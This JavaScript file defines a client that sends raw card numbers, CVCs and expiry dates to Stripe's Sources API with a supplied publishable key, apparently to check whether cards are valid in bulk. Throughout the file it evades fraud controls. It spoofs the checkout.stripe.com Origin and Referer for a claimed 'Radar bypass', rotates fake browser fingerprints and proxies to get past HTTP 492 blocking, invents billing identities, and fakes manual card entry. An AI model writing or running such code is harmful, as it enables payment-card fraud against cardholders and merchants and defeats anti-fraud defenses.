import axios from 'axios';
import { STRIPE_API } from '../../utils/constants.js';
import { fingerprintGenerator } from '../../utils/FingerprintGenerator.js';
import { fakeDataService } from '../../utils/FakeDataService.js';
import { proxyAgentFactory } from '../http/ProxyAgentFactory.js';

/**
 * Stripe Source Client
 * Creates card Sources via Stripe API for SK-based charge validation.
 * 
 * KEY DISCOVERY (Dec 2024):
 * - Source API provides 100% Radar bypass when using checkout.stripe.com origin
 * - Origin MUST be https://checkout.stripe.com (not js.stripe.com)
 * - Referer MUST be https://checkout.stripe.com/
 * - Fingerprints (guid, muid, sid) are REQUIRED
 * - payment_user_agent must include "checkout" suffix
 * - Owner name and address country are required for best results
 * 
 * Requirements: 4.1-4.6
 */
// Retryable proxy/network/timeout error patterns
const RETRYABLE_ERRORS = [
    'proxy connection ended before receiving connect response',
    'client network socket disconnected before secure tls connection was established',
    'socket hang up',
    'unknown error',
    'econnreset',
    'etimedout',
    'econnrefused',
    'stream has been aborted',
    'timeout',
    '30000ms exceeded',
    'exceeded',
    'enotfound',
    'network error',
    'request aborted',
    'aborted'
];

export class StripeSourceClient {
    constructor(options = {}) {
        this.endpoint = STRIPE_API.SOURCES;
        this.timeout = options.timeout || 30000;
        this.proxyFactory = options.proxyFactory || proxyAgentFactory;
        this.maxRetries = options.maxRetries || 3;
        this.retryDelay = options.retryDelay || 3000; // 3 seconds between retries
        this.proxyManager = options.proxyManager || null;
    }

    /**
     * Get a fresh proxy from proxyManager
     * @private
     */
    async _getProxyFromManager() {
        if (this.proxyManager && this.proxyManager.isEnabled()) {
            return await this.proxyManager.getNextProxy();
        }
        return null;
    }

    /**
     * Check if an error is retryable (proxy/network error)
     * @private
     */
    _isRetryableError(error) {
        // Check message
        const message = (error.message || '').toLowerCase();
        // Also check cause message (for wrapped errors)
        const causeMessage = (error.cause?.message || '').toLowerCase();
        // Check error code
        const code = (error.code || '').toLowerCase();

        return RETRYABLE_ERRORS.some(pattern =>
            message.includes(pattern) ||
            causeMessage.includes(pattern) ||
            code.includes(pattern)
        );
    }

    /**
     * Sleep for a given duration
     * @private
     */
    _sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Generate billing details for the source
     * @private
     * @returns {object} Billing details with name and address
     */
    _generateBillingDetails() {
        return fakeDataService.generateBillingDetails();
    }

    /**
     * Create a Source from card details using publishable key
     * 
     * Uses checkout.stripe.com origin headers for Radar bypass (Requirement 4.1)
     * Includes required fingerprints guid, muid, sid (Requirement 4.2)
     * Includes payment_user_agent with checkout suffix (Requirement 4.3)
     * Includes owner name and address country (Requirement 4.4)
     * 
     * @param {object} cardData - Card details { number, expMonth, expYear, cvc }
     * @param {string} pkKey - Stripe publishable key (pk_live_xxx or pk_test_xxx)
     * @param {object} options - Optional settings { proxy, fingerprint, ownerName, country }
     * @returns {Promise<{success: boolean, sourceId?: string, brand?: string, country?: string, last4?: string, error?: string, code?: string}>}
     */
    async createSource(cardData, pkKey, options = {}) {
        const { ownerName, country } = options;

        // Log masked card info for debugging
        const maskedCard = `${cardData.number.slice(0, 6)}******${cardData.number.slice(-4)}`;


        let lastError = null;

        // Retry loop - generate FRESH fingerprints AND proxy on each attempt
        for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
            try {
                // Get FRESH proxy for each attempt (from options or proxyManager)
                const proxy = options.proxy || await this._getProxyFromManager();

                if (proxy) {

                }

                // Generate FRESH fingerprint for each attempt (critical for 492 bypass)
                const fingerprint = fingerprintGenerator.generateFingerprint();
                const stripeIds = fingerprint.stripeIds;

                // Generate fresh billing details
                const billing = this._generateBillingDetails();
                const name = ownerName || billing.name;
                const addressCountry = country || billing.country || 'US';

                // Build request headers with checkout.stripe.com origin (Source API)
                const headers = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    // Source API works best with checkout.stripe.com origin
                    'Origin': 'https://checkout.stripe.com',
                    'Referer': 'https://checkout.stripe.com/',
                    'User-Agent': fingerprint.userAgent,
                    'Accept-Language': fingerprint.language?.acceptLanguage || 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    // Sec-Fetch headers for real browser simulation
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site'
                };

                // Build request body with all required fields
                const data = new URLSearchParams({
                    'type': 'card',
                    'card[number]': cardData.number,
                    'card[cvc]': cardData.cvc || cardData.cvv,
                    'card[exp_month]': String(cardData.expMonth).padStart(2, '0'),
                    'card[exp_year]': String(cardData.expYear).length === 2
                        ? `20${cardData.expYear}`
                        : String(cardData.expYear),
                    // Owner details
                    'owner[name]': name,
                    'owner[address][country]': addressCountry,
                    // Required fingerprints - FRESH each attempt
                    'guid': stripeIds.guid,
                    'muid': stripeIds.muid,
                    'sid': stripeIds.sid,
                    // Payment user agent with checkout suffix (for Source API)
                    'payment_user_agent': 'stripe.js/78c7eece1c; stripe-js-v3/78c7eece1c; checkout',
                    'time_on_page': String(fingerprint.timeOnPage || Math.floor(Math.random() * 50000) + 50000),
                    'key': pkKey,
                    // Anti-fraud: simulate manual entry (not autofill)
                    'pasted_fields': 'number'
                });

                // Create axios config with proxy if provided
                const axiosConfig = this.proxyFactory.createAxiosConfig(proxy, {
                    headers,
                    timeout: this.timeout
                });

                const response = await axios.post(this.endpoint, data.toString(), axiosConfig);

                // Handle successful response (Requirement 4.5)
                if (response.status === 200 && response.data.id) {
                    const sourceData = response.data;


                    return {
                        success: true,
                        sourceId: sourceData.id,
                        brand: sourceData.card?.brand || null,
                        country: sourceData.card?.country || null,
                        last4: sourceData.card?.last4 || null,
                        funding: sourceData.card?.funding || null,
                        expMonth: sourceData.card?.exp_month || null,
                        expYear: sourceData.card?.exp_year || null,
                        threeDSecure: sourceData.card?.three_d_secure || null
                    };
                }

                // Handle error in response body (Requirement 4.6) - don't retry Stripe errors

                return {
                    success: false,
                    error: response.data.error?.message || 'Unknown Stripe error',
                    code: response.data.error?.code || null,
                    declineCode: response.data.error?.decline_code || null
                };
            } catch (error) {
                lastError = error;

                // Check if request was aborted by user (cancelled/disconnected) - don't retry
                // Be specific: only ERR_CANCELED means user abort, not "stream has been aborted" (proxy error)
                if (error.code === 'ERR_CANCELED' || error.name === 'AbortError') {

                    return {
                        success: false,
                        error: 'Request cancelled',
                        isAborted: true
                    };
                }

                // Handle HTTP 492 - Stripe fingerprint blocking - RETRY with fresh fingerprint
                if (error.response?.status === 492 || error.message?.includes('492')) {
                    if (attempt < this.maxRetries) {

                        await this._sleep(2000); // Longer delay for 492
                        continue;
                    }

                    return {
                        success: false,
                        error: 'Stripe blocked request - fingerprint issue after retries',
                        code: 'origin_blocked',
                        isBlocked: true,
                        httpStatus: 492
                    };
                }

                // Handle HTTP 429 - Rate Limited - RETRY with Retry-After header
                if (error.response?.status === 429) {
                    const retryAfter = parseInt(error.response.headers?.['retry-after'] || '5', 10) * 1000;
                    if (attempt < this.maxRetries) {

                        await this._sleep(retryAfter);
                        continue;
                    }

                    return {
                        success: false,
                        error: 'Rate limited by Stripe',
                        code: 'rate_limited',
                        isRateLimited: true,
                        httpStatus: 429
                    };
                }

                // Handle Stripe API errors - don't retry
                if (error.response?.data?.error) {
                    const stripeError = error.response.data.error;

                    return {
                        success: false,
                        error: stripeError.message || 'Stripe API error',
                        code: stripeError.code || null,
                        declineCode: stripeError.decline_code || null,
                        param: stripeError.param || null
                    };
                }

                // Check if error is retryable (proxy/network errors)
                const isRetryable = this._isRetryableError(error);

                if (isRetryable && attempt < this.maxRetries) {
                    // Return immediately with needsRetry flag - don't block the worker

                    return {
                        success: false,
                        error: error.message,
                        isNetworkError: true,
                        needsRetry: true,
                        attemptNumber: attempt,
                        maxRetries: this.maxRetries
                    };
                }

                // Non-retryable or max retries reached
                if (isRetryable) {

                } else {

                }
            }
        }

        // All retries exhausted - return last error

        return {
            success: false,
            error: lastError?.message || 'Network error after retries',
            isNetworkError: true,
            retriesExhausted: true
        };
    }
}

// Export singleton instance for convenience
export const stripeSourceClient = new StripeSourceClient();

